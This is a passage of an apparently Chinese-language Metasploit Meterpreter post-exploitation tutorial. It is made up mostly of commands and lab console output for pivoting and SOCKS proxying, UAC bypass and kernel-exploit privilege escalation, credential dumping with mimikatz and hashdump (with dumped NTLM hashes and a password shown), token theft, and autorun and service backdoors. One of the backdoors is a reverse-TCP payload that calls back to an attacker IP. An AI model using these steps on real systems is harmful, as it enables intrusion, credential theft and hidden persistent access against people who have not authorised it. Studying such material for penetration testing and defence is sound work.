class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"># 基本</span><br><span class="line">ipconfig/ifconfig</span><br><span class="line">netstat –ano</span><br><span class="line">arp</span><br><span class="line">getproxy   #查看代理信息</span><br><span class="line">route   #查看路由</span><br><span class="line"></span><br><span class="line"># portfwd端口转发</span><br><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 # 将目标机的3389端口转发到本地6666端口</span><br><span class="line">rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 添加路由</span><br><span class="line"></span><br><span class="line"># 方式一autoroute （deprecated）</span><br><span class="line">run autoroute –h #查看帮助</span><br><span class="line">run autoroute -s 192.168.2.0/24  #添加到目标环境网络</span><br><span class="line">run autoroute –p  #查看添加的路由</span><br><span class="line"># 方式二post/multi/manage/autoroute</span><br><span class="line">run post/multi/manage/autoroute CMD=autoadd #自动添加到目标环境网络</span><br><span class="line">run post/multi/manage/autoroute CMD=print # 查看添加的路由</span><br><span class="line">(Specify the autoroute command (Accepted: add, autoadd, print, delete, default))</span><br><span class="line"></span><br><span class="line"># 然后可以利用arp_scanner、portscan等进行扫描</span><br><span class="line">run arp_scanner -r 192.168.2.0/24</span><br><span class="line">run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0</span><br><span class="line"></span><br><span class="line"># autoroute添加完路由后，还可以利用msf自带的模块进行socks代理</span><br><span class="line"># msf提供了2个模块用来做socks代理。</span><br><span class="line"># auxiliary/server/socks_proxy</span><br><span class="line"># use auxiliary/server/socks_unc</span><br><span class="line"># 先background退出来，然后：</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set srvport 1080</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"># 然后vi /etc/proxychains.conf #添加 socks5 127.0.0.1 1080</span><br><span class="line"># 最后proxychains 使用Socks5代理访问</span><br><span class="line"></span><br><span class="line"># sniffer抓包</span><br><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   #查看网卡</span><br><span class="line">sniffer_start 2   #选择网卡 开始抓包</span><br><span class="line">sniffer_stats 2   #查看状态</span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包</span><br><span class="line">sniffer_stop 2   #停止抓包</span><br></pre></td></tr></table></figure>

<h3 id="4-4-信息收集-5"><a href="#4-4-信息收集-5" class="headerlink" title="4.4 信息收集"></a>4.4 信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 信息收集的脚本位于：</span><br><span class="line"># modules/post/windows/gather</span><br><span class="line"># modules/post/linux/gather</span><br><span class="line"># 以下列举一些常用的</span><br><span class="line">run post/windows/gather/checkvm #是否虚拟机</span><br><span class="line">run post/linux/gather/checkvm #是否虚拟机</span><br><span class="line">run post/windows/gather/forensics/enum_drives #查看分区</span><br><span class="line">run post/windows/gather/enum_applications #获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks   #获取最近的文件操作</span><br><span class="line">run post/windows/gather/enum_ie  #获取IE缓存</span><br><span class="line">run post/windows/gather/enum_chrome   #获取Chrome缓存</span><br><span class="line">run post/windows/gather/enum_patches  #补丁信息</span><br><span class="line">run post/windows/gather/enum_domain  #查找域控</span><br></pre></td></tr></table></figure>

<h3 id="4-5-提权-5"><a href="#4-5-提权-5" class="headerlink" title="4.5 提权"></a>4.5 提权</h3>1.getsystem提权<br>getsystem工作原理：<br>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。<br>②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。<br>③Windows服务已启动，导致与命名管道建立连接。<br>④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem  </span><br></pre></td></tr></table></figure>

2.bypassuac<br>用户帐户控制（UAC）是微软在 Windows Vista 以后版本引入的一种安全机制，有助于防止对系统进行未经授权的更改。应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员专门给系统授予管理员级别的访问权限。UAC 可以阻止未经授权的应用程序进行自动安装，并防止无意中更改系统设置。msf提供了如下几个模块帮助绕过UAC：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(server/socks5) &gt; search bypassuac</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                              Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">   1  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">   2  exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">   3  exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">   4  exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">   5  exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">   6  exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line">   7  exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br></pre></td></tr></table></figure>

使用方法类似，运行后返回一个新的会话，<strong>需要再次执行getsystem获取系统权限</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># 示例</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: SAUCERMAN\TideSec</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(multi/handler) &gt;  use exploit/windows/local/bypassuac</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; set SESSION 4</span><br><span class="line">SESSION =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; run</span><br><span class="line"></span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] UAC is set to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[*] Uploaded the agent to the filesystem....</span><br><span class="line">[*] Uploading the bypass UAC executable to the filesystem...</span><br><span class="line">[*] Meterpreter stager executable 73802 bytes long being uploaded..</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.81.154</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.81.160:4444 -&gt; 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700</span><br><span class="line">[-] Exploit failed [timeout-expired]: Timeout::Error execution expired</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line"># 然后返回新的meterpreter会话，继续执行getsystem本应该会提权成功</span><br><span class="line"># 然鹅这里失败了</span><br></pre></td></tr></table></figure>

3.内核漏洞提权无论是linux还是windows都出过很多高危的漏洞，我们可以利用它们进行权限提升，比如windows系统的ms13-081、ms15-051、ms16-032、ms17-010等，msf也集成了这些漏洞的利用模块。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  #查看补丁信息</span><br><span class="line">msf5 &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf5 &gt; set SESSION 2</span><br><span class="line">msf5 &gt; exploit</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; search MS13-081</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                             Disclosure Date  Rank     Check  Description</span><br><span class="line">   -  ----                                             ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/local/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Page</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; use exploit/windows/local/ms13_081_track_popup_menu</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; set session 4</span><br><span class="line">session =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; exploit</span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module.</span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"># 然鹅失败了，摸摸头</span><br></pre></td></tr></table></figure>

<h3 id="4-6-获取凭证-5"><a href="#4-6-获取凭证-5" class="headerlink" title="4.6 获取凭证"></a>4.6 获取凭证</h3>在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。1.使用mimikatz<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz    #help mimikatz 查看帮助</span><br><span class="line">wdigest  #获取Wdigest密码</span><br><span class="line">mimikatz_command -f samdump::hashes  #执行mimikatz原始命令</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &#x27;load kiwi&#x27; instead?</span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[!] Not currently running as SYSTEM</span><br><span class="line">[*] Attempting to getprivs ...</span><br><span class="line">[+] Got SeDebugPrivilege.</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain        User           Password</span><br><span class="line">------    -------    ------        ----           --------</span><br><span class="line">0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  </span><br><span class="line">0;996     Negotiate  WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;48748   NTLM                                    </span><br><span class="line">0;999     NTLM       WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;476238  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line">0;476209  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">Ordinateur : saucerman</span><br><span class="line">BootKey    : 691cff33caf49e933be97fcee370256a</span><br><span class="line">RegOpenKeyEx SAM : (0x00000005) �ݿ� </span><br><span class="line">Erreur lors de l&#x27;exploration du registremeterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords[0] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[1] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[2] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[3] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[4] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[5] &#123; TideSec ; SAUCERMAN ; 123456 &#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>使用meterpreter的run hashdump命令</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.</span><br><span class="line">[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">TideSec:&quot;123456&quot;</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>

3.post/windows/gather/smart_hashdump从上面也可以看出官方推荐<code>post/windows/gather/smart_hashdump</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*]     Obtaining the boot key...</span><br><span class="line">[*]     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">[*]     Obtaining the user list and keys...</span><br><span class="line">[*]     Decrypting user keys...</span><br><span class="line">[*]     Dumping password hints...</span><br><span class="line">[+]     TideSec:&quot;123456&quot;</span><br><span class="line">[*]     Dumping password hashes...</span><br><span class="line">[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+]     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>

4.powerdump<br>同 hashdump，但失败了<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run powerdump</span><br><span class="line">[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Running PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...</span><br><span class="line">[*] Setting ExecutionPolicy to Unrestricted...</span><br><span class="line">[*] Dumping the SAM database through PowerShell...</span><br><span class="line"></span><br><span class="line">[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.</span><br></pre></td></tr></table></figure>

<h3 id="4-7-假冒令牌-5"><a href="#4-7-假冒令牌-5" class="headerlink" title="4.7 假冒令牌"></a>4.7 假冒令牌</h3>在用户登录windows操作系统时，系统都会给用户分配一个令牌(Token)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 1.incognito假冒令牌</span><br><span class="line">use incognito      #help incognito  查看帮助</span><br><span class="line">list_tokens -u    #查看可用的token</span><br><span class="line">impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27;  #假冒SYSTEM token</span><br><span class="line">或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\</span><br><span class="line">execute -f cmd.exe -i –t    # -t 使用假冒的token 执行</span><br><span class="line">或者直接shell</span><br><span class="line">rev2self   #返回原始token</span><br><span class="line"></span><br><span class="line"># 2.steal_token窃取令牌</span><br><span class="line">steal_token &lt;pid值&gt;   #从指定进程中窃取token   先ps</span><br><span class="line">drop_token  #删除窃取的token</span><br></pre></td></tr></table></figure>

<h3 id="4-8-植入后门-5"><a href="#4-8-植入后门-5" class="headerlink" title="4.8 植入后门"></a>4.8 植入后门</h3>Meterpreter仅仅是在内存中驻留的Shellcode，只要目标机器重启就会丧失控制权，下面就介绍如何植入后门，维持控制。1.persistence启动项后门路径：metasploit/scripts/meterpreter/persistence原理是在<code>C:\Users***\AppData\Local\Temp\</code>目录下，上传一个vbs脚本，在注册表<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>加入开机启动项，<strong>很容易被杀软拦截，官方不推荐</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">run persistence –h  #查看帮助</span><br><span class="line">run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line">#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444</span><br><span class="line">[*] Persistent agent script is 99630 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[+] Agent executed with PID 3540</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br></pre></td></tr></table></figure>

能实现同样功能的脚本还有：exploit/windows/local/persistence2.metsvc服务后门在C:\Users<em><strong>\AppData\Local\Temp\目录下，上传一个vbs脚本<br>在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项。</strong>通过服务启动，需要管理员权限，官方不推荐使用，运行失败</em>*<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">run metsvc –A   #自动安装后门</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run metsvc –A</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">    Cannot open service manager (0x00000005)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH</span><br><span class="line">========================================================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  178688  fil   2019-06-12 06:46:20 -0700  metsrv.dll</span><br><span class="line">100777/rwxrwxrwx  45056   fil   2019-06-12 06:46:21 -0700  metsvc-server.exe</span><br><span class="line">100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe</span><br></pre></td></tr></table></figure>

三个文件上传成功，但服务没有启动起来，失败了。使用<code>-r</code>参数可卸载服务。3.persistence_exe再来看看官方推荐的东西吧<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; info post/windows/manage/persistence_exe</span><br><span class="line"></span><br><span class="line">       Name: Windows Manage Persistent EXE Payload Installer</span><br><span class="line">     Module: post/windows/manage/persistence_exe</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: </span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Merlyn drforbin Cousins &lt;drforbin6@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">Compatible session types:</span><br><span class="line">  Meterpreter</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name      Current Setting  Required  Description</span><br><span class="line">  ----      ---------------  --------  -----------</span><br><span class="line">  REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">  REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">  SESSION                    yes       The session to run this module on.</span><br><span class="line">  STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This Module will upload an executable to a remote host and make it </span><br><span class="line">  Persistent. It can be installed 